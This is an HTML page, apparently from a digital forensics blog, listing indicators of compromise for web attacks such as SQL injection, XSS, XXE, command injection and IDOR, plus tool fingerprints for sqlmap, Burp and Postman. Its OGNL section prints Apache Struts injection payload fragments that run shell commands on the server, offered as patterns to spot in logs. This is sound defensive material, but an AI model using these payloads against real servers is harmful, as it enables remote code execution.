@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Web Attacks - Analyst</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <link rel="icon" href="https://bakerst221b.com/favicon.png">
+  <link href="/css/style-classic.css"></link>
+  
+  
+  <link rel="stylesheet" href="/css/style.min.564b5f4faf3af87992cb8ab298314448914c22dbdb3f2f9c584546b21b8d407c.css">
+  
+
+  
+
+</head>
+
+<body class='page page-default-single'>
+  <div id="main-menu-mobile" class="main-menu-mobile">
+  <ul>
+    
+    
+    <li class="menu-item-home 🏡">
+      <a href="/">
+        <span>Home 🏡</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-blog ✍️">
+      <a href="/docs/blog">
+        <span>Blog ✍️</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-dfir 🔍">
+      <a href="/docs/dfir">
+        <span>DFIR 🔍</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-crypto 🗝️">
+      <a href="/docs/cryptography">
+        <span>Crypto 🗝️</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-reverse 🔧">
+      <a href="/docs/reverse">
+        <span>Reverse 🔧</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-toolkit 🧰">
+      <a href="/docs/toolkit">
+        <span>Toolkit 🧰</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-threat hunting 🪤">
+      <a href="/docs/thunting">
+        <span>Threat Hunting 🪤</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-about me 🧝🏽‍♀️">
+      <a href="/docs/about">
+        <span>About me 🧝🏽‍♀️</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-tech reference 📚">
+      <a href="/docs/reference">
+        <span>Tech Reference 📚</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-notes 📝">
+      <a href="/docs/notes">
+        <span>Notes 📝</span>
+      </a>
+    </li>
+    
+  </ul>
+</div>
+  <div class="wrapper">
+    <div class='header'>
+  <div class="container">
+    <div class="logo">
+      <a href="https://bakerst221b.com"><img alt="Logo" src="/images/logo.png" /></a>
+    </div>
+    <div class="logo-mobile">
+      <a href="https://bakerst221b.com"><img alt="Logo" src="/images/logo-mobile.svg" /></a>
+    </div>
+    <div id="main-menu" class="main-menu">
+  <ul>
+    
+    
+    <li class="menu-item-home 🏡">
+      <a href="/">
+        <span>Home 🏡</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-blog ✍️">
+      <a href="/docs/blog">
+        <span>Blog ✍️</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-dfir 🔍">
+      <a href="/docs/dfir">
+        <span>DFIR 🔍</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-crypto 🗝️">
+      <a href="/docs/cryptography">
+        <span>Crypto 🗝️</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-reverse 🔧">
+      <a href="/docs/reverse">
+        <span>Reverse 🔧</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-toolkit 🧰">
+      <a href="/docs/toolkit">
+        <span>Toolkit 🧰</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-threat hunting 🪤">
+      <a href="/docs/thunting">
+        <span>Threat Hunting 🪤</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-about me 🧝🏽‍♀️">
+      <a href="/docs/about">
+        <span>About me 🧝🏽‍♀️</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-tech reference 📚">
+      <a href="/docs/reference">
+        <span>Tech Reference 📚</span>
+      </a>
+    </li>
+    
+    <li class="menu-item-notes 📝">
+      <a href="/docs/notes">
+        <span>Notes 📝</span>
+      </a>
+    </li>
+    
+  </ul>
+</div>
+    <button id="toggle-main-menu-mobile" class="hamburger hamburger--slider" type="button">
+  <span class="hamburger-box">
+    <span class="hamburger-inner"></span>
+  </span>
+</button>
+  </div>
+</div>
+
+
+    
+    
+    
+    
+    
+    
+
+    
+    <div class="container pt-2 pt-md-6 pb-3 pb-md-6">
+      <div class="row">
+        <div class="col-12 col-md-3 mb-3">
+          <div class="sidebar">
+            
+<div class="docs-menu">
+  <p>
+   <a href="/docs/dfir/investigation/arsenal/red/"> 👈🏼 Back to </br> 🪓 Red Team Arsenal </a>
+  </p>
+  <aside>
+   <nav id="TableOfContents">
+  <ul>
+    <li><a href="#sqli">SQLi</a>
+      <ul>
+        <li><a href="#-payloads-iocs">⚙️ Payloads IoCs</a></li>
+        <li><a href="#-tools-iocs">🛠 Tools IoCs</a>
+          <ul>
+            <li><a href="#sqlmap"><code>sqlmap</code></a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#xxs">XXS</a>
+      <ul>
+        <li><a href="#-payloads-iocs-1">⚙️ Payloads IoCs</a></li>
+        <li><a href="#-tools-iocs-1">🛠 Tools IoCs</a></li>
+      </ul>
+    </li>
+    <li><a href="#xxe">XXE</a>
+      <ul>
+        <li><a href="#-payloads-iocs-2">⚙️ Payloads IoCs</a></li>
+        <li><a href="#-tools-iocs-2">🛠 Tools IoCs</a></li>
+      </ul>
+    </li>
+    <li><a href="#cmdi">CMDi</a>
+      <ul>
+        <li><a href="#-payloads-iocs-3">⚙️ Payloads IoCs</a></li>
+        <li><a href="#-tools-iocs-3">🛠 Tools IoCs</a></li>
+      </ul>
+    </li>
+    <li><a href="#idor">IDOR</a>
+      <ul>
+        <li><a href="#-payloads-iocs-4">⚙️ Payloads IoCs</a></li>
+        <li><a href="#-tools-iocs-4">🛠 Tools IoCs</a></li>
+      </ul>
+    </li>
+    <li><a href="#html-injection">HTML Injection</a></li>
+    <li><a href="#ognl">OGNL</a>
+      <ul>
+        <li><a href="#-payloads-iocs-5">⚙️ Payloads IoCs</a></li>
+        <li><a href="#-tools-iocs-5">🛠 Tools IoCs</a></li>
+      </ul>
+    </li>
+    <li><a href="#dirbusting">Dirbusting</a>
+      <ul>
+        <li><a href="#-payloads-iocs-6">⚙️ Payloads IoCs</a></li>
+        <li><a href="#-tools-iocs-6">🛠 Tools IoCs</a></li>
+      </ul>
+    </li>
+    <li><a href="#fuzzing">Fuzzing</a>
+      <ul>
+        <li><a href="#-payloads-iocs-7">⚙️ Payloads IoCs</a></li>
+        <li><a href="#-tools-iocs-7">🛠 Tools IoCs</a></li>
+      </ul>
+    </li>
+    <li><a href="#swiss-knives-frameworks-and-other-tools-ioc">Swiss Knives, Frameworks and Other Tools&rsquo; IoC</a>
+      <ul>
+        <li><a href="#burp">Burp</a></li>
+        <li><a href="#metasploit">Metasploit</a></li>
+        <li><a href="#postman">Postman</a></li>
+        <li><a href="#heading"></a></li>
+      </ul>
+    </li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+ </aside>
+</div>
+
+
+
+          </div>
+        </div>
+        <div class="col-12 col-md-9">
+          
+<h1 class="title">Web Attacks</h1>
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    <div class="meta">
+      
+      
+
+      
+      
+
+      
+    </div>
+  </header>
+
+
+  <div class="content" itemprop="articleBody">
+    <p>Of course, there are lots of payloads out there. But I hope this section can give some idea on what to expect when dealing with web server/application attacks.</p>
+<h2 id="sqli">SQLi</h2>
+<h3 id="-payloads-iocs">⚙️ Payloads IoCs</h3>
+<p><a href="https://github.com/payloadbox/sql-injection-payload-list">https://github.com/payloadbox/sql-injection-payload-list</a>
+<a href="https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt">https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt</a>
+<a href="https://github.com/omurugur/SQL_Injection_Payload">https://github.com/omurugur/SQL_Injection_Payload</a></p>
+<h3 id="-tools-iocs">🛠 Tools IoCs</h3>
+<h4 id="sqlmap"><code>sqlmap</code></h4>
+<p>It can be run as a standalone CLI tool or as a part of Burp.</p>
+<ul>
+<li><input disabled="" type="checkbox"> <code>User-Agent</code> HTTP header contains sqlmap and its version by default.</li>
+<li><input disabled="" type="checkbox"> </li>
+</ul>
+<h2 id="xxs">XXS</h2>
+<p>There are three types of XSS: DOM, Stored and reflected.</p>
+<h3 id="-payloads-iocs-1">⚙️ Payloads IoCs</h3>
+<p><a href="https://github.com/payloadbox/xss-payload-list">https://github.com/payloadbox/xss-payload-list</a></p>
+<h3 id="-tools-iocs-1">🛠 Tools IoCs</h3>
+<h2 id="xxe">XXE</h2>
+<h3 id="-payloads-iocs-2">⚙️ Payloads IoCs</h3>
+<p><a href="https://github.com/payloadbox/xxe-injection-payload-list">https://github.com/payloadbox/xxe-injection-payload-list</a></p>
+<h3 id="-tools-iocs-2">🛠 Tools IoCs</h3>
+<h2 id="cmdi">CMDi</h2>
+<h3 id="-payloads-iocs-3">⚙️ Payloads IoCs</h3>
+<p><a href="https://github.com/payloadbox/command-injection-payload-list">https://github.com/payloadbox/command-injection-payload-list</a></p>
+<ul>
+<li><input disabled="" type="checkbox"> <code>ping</code> and <code>nslookup</code> keywords where these are not expected</li>
+</ul>
+<h3 id="-tools-iocs-3">🛠 Tools IoCs</h3>
+<h2 id="idor">IDOR</h2>
+<h3 id="-payloads-iocs-4">⚙️ Payloads IoCs</h3>
+<p>It&rsquo;s a very special vulnerability, and it&rsquo;s hard to define a pattern. If you log IP addresses and user IDs (id, username, email or any other identification) - look for the requests with the same IP and different ID.</p>
+<p>Multiple <code>404</code> HTTP status code would be probably seen in this case if the attacker, who has found this issue, tried to enumerate IDs. Of course, to completely prevent IDOR one needs to implement proper authorisation process, however, it&rsquo;s also clear from this vulnerability why having short and predictable IDs is not good. But even if the IDs are randomly generated GUIDs, still this won&rsquo;t protect from IDOR, just make the attacker&rsquo;s life a little harder.</p>
+<h3 id="-tools-iocs-4">🛠 Tools IoCs</h3>
+<ul>
+<li><input disabled="" type="checkbox"> Burp (see at the end of this article)</li>
+</ul>
+<h2 id="html-injection">HTML Injection</h2>
+<p>About this vulnerability read <a href="https://www.invicti.com/learn/html-injection/">here</a>.</p>
+<h2 id="ognl">OGNL</h2>
+<p>About OGNL, read <a href="https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts">here</a>.</p>
+<h3 id="-payloads-iocs-5">⚙️ Payloads IoCs</h3>
+<p><a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/struts2_namespace_ognl.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/struts2_namespace_ognl.rb</a></p>
+<ul>
+<li><input disabled="" type="checkbox"> <code>gk6q${“zkz”.toString().replace(“k”, “x”)}doap2</code></li>
+<li><input disabled="" type="checkbox"> <code>https://www.example.url/?vulnerableParameter=PRE-${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.print(new%20java.lang.Integer(829%2b9))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}-POST&amp;INJPARAM=HOOK_VAL</code></li>
+<li><input disabled="" type="checkbox"> <code>${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;id&quot;).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Qualys-Response&quot;,#a))}</code></li>
+<li><input disabled="" type="checkbox"> <code>(#_='multipart/form-data')</code></li>
+<li><input disabled="" type="checkbox"> <code>(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)</code></li>
+<li><input disabled="" type="checkbox"> <code>(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])</code></li>
+<li><input disabled="" type="checkbox"> <code>(#context['xwork.MethodAccessor.denyMethodExecution']=false)</code></li>
+<li><input disabled="" type="checkbox"> <code>(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&gt;</code></li>
+<li><input disabled="" type="checkbox"> <code>(#ognlUtil.getExcludedPackageNames().clear())</code></li>
+<li><input disabled="" type="checkbox"> <code>(#ognlUtil.getExcludedClasses().clear())</code></li>
+<li><input disabled="" type="checkbox"> <code>(#context.setMemberAccess(#dm))))</code></li>
+<li><input disabled="" type="checkbox"> <code>(#cmd='/usr/bin/touch /tmp/pwned').(#iswin=@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))</code></li>
+<li><input disabled="" type="checkbox"> <code>(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))</code></li>
+<li><input disabled="" type="checkbox"> <code>(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())</code></li>
+<li><input disabled="" type="checkbox"> <code>(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))</code></li>
+<li><input disabled="" type="checkbox"> <code>(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())</code></li>
+</ul>
+<h3 id="-tools-iocs-5">🛠 Tools IoCs</h3>
+<ul>
+<li><input disabled="" type="checkbox"> Burp (see at the end of this article)</li>
+</ul>
+<h2 id="dirbusting">Dirbusting</h2>
+<h3 id="-payloads-iocs-6">⚙️ Payloads IoCs</h3>
+<h3 id="-tools-iocs-6">🛠 Tools IoCs</h3>
+<ul>
+<li><input disabled="" type="checkbox"> Burp (see at the end of this article)</li>
+<li><input disabled="" type="checkbox"> <code>dirb</code>
+<ul>
+<li><input disabled="" type="checkbox"> Linux</li>
+<li><input disabled="" type="checkbox"> macOS</li>
+</ul>
+</li>
+</ul>
+<h2 id="fuzzing">Fuzzing</h2>
+<h3 id="-payloads-iocs-7">⚙️ Payloads IoCs</h3>
+<ul>
+<li><input disabled="" type="checkbox"> <a href="https://github.com/Bo0oM/fuzz.txt">fuzz.txt</a></li>
+</ul>
+<h3 id="-tools-iocs-7">🛠 Tools IoCs</h3>
+<h2 id="swiss-knives-frameworks-and-other-tools-ioc">Swiss Knives, Frameworks and Other Tools&rsquo; IoC</h2>
+<h3 id="burp">Burp</h3>
+<ul>
+<li><input disabled="" type="checkbox"> <code>*.oastify.com</code> domain</li>
+<li><input disabled="" type="checkbox"> </li>
+</ul>
+<h3 id="metasploit">Metasploit</h3>
+<h3 id="postman">Postman</h3>
+<ul>
+<li><input disabled="" type="checkbox"> The <code>User-Agent</code> HTTP header contains <code>Postman</code> keyword and its version.</li>
+</ul>
+<h3 id="heading"></h3>
+<h2 id="references">References</h2>
+<details>
+    <summary>Expand&hellip;</summary>
+    Something here
+</details>
+
+  </div>
+</article>
+</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+    
+  </div>
+
+  <div class="sub-footer">
+  <div class="container">
+    <div class="row">
+      <div class="col-12">
+        <div class="sub-footer-inner">
+          <ul>
+            <li class="zerostatic"><a href="https://www.zerostatic.io">www.zerostatic.io</a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/scripts.min.bafc052229b4b40bf03c477d31c5cdd9352ece8afbadf35ab97ed14495098fc9.js"></script>
+  
+
+  
+  
+  
+    
+  
+
+
+</body>
+
+</html>
